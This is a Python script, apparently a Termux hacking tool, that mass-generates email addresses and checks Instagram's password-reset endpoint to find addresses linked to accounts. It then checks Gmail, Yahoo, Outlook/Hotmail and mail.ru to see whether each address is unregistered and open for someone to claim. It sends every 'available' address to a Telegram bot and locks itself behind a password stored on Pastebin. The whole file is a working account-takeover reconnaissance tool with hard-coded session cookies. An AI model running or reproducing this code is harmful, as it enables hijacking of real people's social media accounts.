import requests
import requests
import sys,os,time
from time import sleep
os.system("clear")
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
Sidra ="""
 \033[1;96m ------------------------
 \033[1;32m < COD BY SIDRA ELEZZ >
 \033[1;96m ------------------------
\033[1;91m ____  _     _
\033[1;92m/ ___|(_) __| |_ __ __ _
\033[1;91m\___ \| |/ _` | '__/ _` |
\033[1;92m ___) | | (_| | | | (_| |
\033[1;91m|____/|_|\__,_|_|  \__,_|
           \033[1;93m _____ _     _____
           \033[1;92m| ____| |   | ____|________
           \033[1;91m|  _| | |   |  _| |_  /_  /
           \033[1;92m| |___| |___| |___ / / / /
           \033[1;91m|_____|_____|_____/___/___|\033[1;92m @TT_RQ
           
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : SIDRA ELEZZ
 Telegram   : TERMUX TOOLS
 YOUTUBE    : TERMUX TOOLS
 GITHUB     : GITHUB.COM/SIDRA ELEZZ
\033[1;32m
--------------------------------------------------
"""
Email = """
\033[1;96m ------------------------
 \033[1;32m < COD BY SIDRA ELEZZ >
 \033[1;96m ------------------------
\033[1;91m _____                 _ _
\033[1;92m| ____|_ __ ___   __ _(_) |
\033[1;91m|  _| | '_ ` _ \ / _` | | |
\033[1;92m| |___| | | | | | (_| | | |
\033[1;91m|_____|_| |_| |_|\__,_|_|_|

              \033[1;93m ___           _
              \033[1;91m|_ _|_ __  ___| |_ __ _
              \033[1;92m | || '_ \/ __| __/ _` |
              \033[1;91m | || | | \__ \ || (_| |
              \033[1;92m|___|_| |_|___/\__\__,_|
  
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : SIDRA ELEZZ
 Telegram   : TERMUX TOOLS
 YOUTUBE    : TERMUX TOOLS
 GITHUB     : GITHUB.COM/SIDRA ELEZZ
\033[1;32m
--------------------------------------------------          
"""

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/KKbLu0cb")
print (Sidra)
print ("\033[1;97mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  Top(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  Top("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password !")
  os.system('xdg-open https://t.me/TT_RQ/1')
  sys.exit()
os.system("clear")
import secrets, time,user_agent
import random , requests , uuid , sys ,re
import bs4,threading
from time import sleep
from bs4 import BeautifulSoup
from colorama import Fore as fore
import requests
import subprocess
import json
import mechanize

uuid = uuid.uuid4() 
cokie  = secrets.token_hex(8)*2
r = requests.session()
cookie = secrets.token_hex(8)*2
i = 0
Er = 0
YesH=0
YesY=0
YesG=0
NoH=0
NoY=0
NoG=0
Ro = 0
YesO= 0
NoO= 0
YesR=0
NoR= 0

print (Sidra) 
Top(A+"["+C+"1"+A+"]"+H+ "STERT CHECK ")
Top(A+"["+C+"2"+A+"]"+H+ "Exit ")


Tools = input(E+"\n["+A+"?"+E+"]"+C+ "CHOOSE AN OPTION : "+C)
if Tools == '1':
    os.system('clear')
    print(Email)
    
    Top(E+"Choose the name , ok Example:"+L+"\nAli , Sidra , Ban ")
    Name = input(A+"\n["+C+"!"+A+"]"+H+ "ENTR THE  NAME : "+C)
    Top(A+"\n["+C+"!"+A+"]"+E+ " @gmail.com")
    Top(A+"\n["+C+"!"+A+"]"+H+ " @yahoo.com")
    Top(A+"\n["+C+"!"+A+"]"+E+ " @hotmail.com")
    Top(A+"\n["+C+"!"+A+"]"+H+ " @outlook.com")
    Top(A+"\n["+C+"!"+A+"]"+E+ " @mail.ru")
    Domn = input(A+"\n["+C+"!"+A+"]"+H+ "ENTR THE DOMAN : "+C)
    token = input(A+"\n["+C+"!"+A+"]"+H+ "TOKEN BOT : "+C)
    ID = input(A+"\n["+C+"!"+A+"]"+H+ "ID YOUR TEL: "+C)
    start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=START CHECK INSTA  ⚡⁦").json()#Tofe_x
    id_msg	=(start_msg['result']["message_id"])
    print(L+'\n--------------------------------------------------')
    
    while True:
        #Se = str(''.join((random.choice(USER_1) for i in range(4))))
        i+=1
        if i == 50000:
        	i=0
        eml=(Name+ "%d" % (i+1) + Domn)
        if eml == '':
        	break
        url_r = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
        headers_r = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '95',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=WTmjI1945KEE4S356XwiCKGQxXP9EGZL',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/password/reset/',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-csrftoken': 'WTmjI1945KEE4S356XwiCKGQxXP9EGZL',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4',
		'x-instagram-ajax': '753ce878cd6d',
		'x-requested-with': 'XMLHttpRequest'}
        data_r = {
		'email_or_username': eml,
		'recaptcha_challenge_field': '',
		'flow': '',
		'app_id': ''}
        #try:
        
        
        go = r.post(url_r,headers=headers_r,data=data_r).text
   
        if '"can_recover_with_code":false' in go:
        	
            print (A+"["+C+"*"+A+"]"+L+eml)
        	
            if 'gmail' in eml:
                UrG = "https://mmo69.com/_check_live_email/api.php?email=" + eml
                HadG = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ar",
        "Connection": "keep-alive",
        "Host": "mmo69.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
    }
                DatG = {"email": eml}
                ok = r.post(UrG,headers=HadG,data=DatG)
                if ok.text.find("LIVE") >= 0:
                    Ro+=1
                    YesG+=1
                    print(E+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Available EMAIL ✓✰︎\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                else:
                	
                    Ro+=1
                    NoG+=1
                    print(A+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    
                
                
            elif 'hotmail' in eml:
                urlH = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + eml + "&_=1604288577990"
                dataH = ''
                headersH = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
                html = r.get(urlH, data=dataH, headers=headersH)
                if 'Neither' in html.text:
                    Ro+=1
                    YesH+=1
                    print(E+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Available EMAIL ✓✰︎\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    #print
                else:
                    Ro+=1
                    NoH+=1
                    print(A+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                #print
                
            elif 'yahoo' in eml:
                br = mechanize.Browser()
                br.set_handle_equiv(True)
                br.set_handle_redirect(True)
                br.set_handle_referer(True)
                br.set_handle_robots(False)
                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                br.addheaders = [('User-agent', 'Mozila')]
                login = 'https://login.yahoo.com/?display=narrow&.intl=xa&.lang=ar-JO&.src=fpctx&done=https%3A%2F%2Fmaktoob.yahoo.com%2F&prefill=0&chllngnm=base'
                br.open(login)
                br.select_form(nr=0)
                br.form['username'] = eml
                sub = br.submit()
                urlY = sub.geturl()
                if urlY == login:
                    Ro+=1
                    YesY+=1
                    print(E+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Available EMAIL ✓✰︎\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                else:
                    Ro+=1
                    NoY+=1
                    print(A+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                
            elif 'outlook' in eml:
                urlH = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + eml + "&_=1604288577990"
                dataH = ''
                headersH = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
                html = r.get(urlH, data=dataH, headers=headersH)
                if 'Neither' in html.text:
                    Ro+=1
                    YesO+=1
                    print(E+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Available EMAIL ✓✰︎\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    #print
                else:
                    Ro+=1
                    NoO+=1
                    print(A+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                #print
                
            elif '@mail.ru' in eml:
            	
                urlR = 'https://account.mail.ru/api/v1/user/exists'
                data_6 = {'email': eml}
                headers_6 = { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
                js = requests.post(urlR, data=data_6, headers=headers_6)
                if str(js.json()['body']['exists']) == 'False':
                    Ro+=1
                    YesR+=1
                    print(E+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Available EMAIL ✓✰︎\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    #print
                else:
                    Ro+=1
                    NoR+=1
                    print(A+eml)
                    r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
                    
                #print
                
            #print
        else:
            Ro+=1
            Er+=1
            print(C+eml)
            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ TOOLS CHECK INSTA  ⚡⁦✰︎\n-----------------------------------------\n.✥. Yahoo   💯   : {YesY}  .✥. Yahoo   ❌ : {NoY}\n\n.✥. Outlook 💯  : {YesO}  .✥. Outlook ❌ : {NoO}\n\n.✥. Hotmail 💯  : {YesH}  .✥. Hotmail ❌ : {NoH}\n\n.✥. mail.ru  💯  : {YesR}   .✥. mail.ru   ❌ : {NoR}\n\n.✥. Gmail   💯   : {YesG}   .✥. Gmail     ❌ : {NoG}\n\n.✥. STERT CHECK⚡ : {Ro}\n\n-----------------------------------------\n\n.✥. Unlinked to instagram  : {Er}\n\n-----------------------------------------\n\n[ → {eml} ← ]\n\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
        
